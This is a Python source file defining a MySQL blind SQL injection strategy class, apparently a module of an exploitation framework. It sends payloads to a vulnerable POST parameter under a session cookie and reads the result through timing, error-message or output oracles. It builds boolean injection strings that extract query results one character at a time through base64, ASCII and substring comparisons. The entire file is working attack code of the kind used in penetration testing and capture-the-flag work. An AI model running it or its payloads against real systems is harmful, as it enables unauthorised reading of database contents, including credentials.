from strategies.abstract_strategy import AbstractStrategy

class MYSQLiStrategy(AbstractStrategy):
    def __init__(self, url):
        super().__init__()
        self.url = url
        self.session.cookies.update({"PHPSESSID": "XXXXXXXXX"})

    def send_payload(self, payload, timeout=10):
        try:
            cookies = {"PHPSESSID": "XXXXXXXXX"}
            data = {"vuln_param": payload} 
            response = self.session.post(self.url, data=data, cookies=cookies, timeout=timeout)
            response.raise_for_status() # Comment this if it always returns something else than 200 or if false state returns something else than 200
            # Example time-based oracle. Don't forget to add sleep in your payload with the timeout value
            return response.elapsed.total_seconds() <= timeout
            # Exemple search for a specific error message in the response text
            return "SPECIFIC ERROR MESSAGE" not in response.text # or return "SPECIFIC SUCCESS MESSAGE" in response.text
            # Exemple parse specific output, eg. if the backend replies something like "Hi Mister 0! This is the output code: 0. Good luck haha!"
            return response.text.split("This is the output code:")[0].split(".")[0] == "0" 
        except Exception:
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"1' OR (SELECT LENGTH(TO_base64({cmd}))) >= {length};-- -"
    
    def create_char_check_payload(self, cmd, position, char_value):
        return f"1' OR ASCII(SUBSTRING(TO_BASE64(({cmd})),{position+1},1))={char_value}-- -"
    
    def create_char_less_than_payload(self, cmd, position, char_value):
        return f"1' OR ASCII(SUBSTRING(TO_BASE64(({cmd})),{position+1},1))<{char_value}-- -"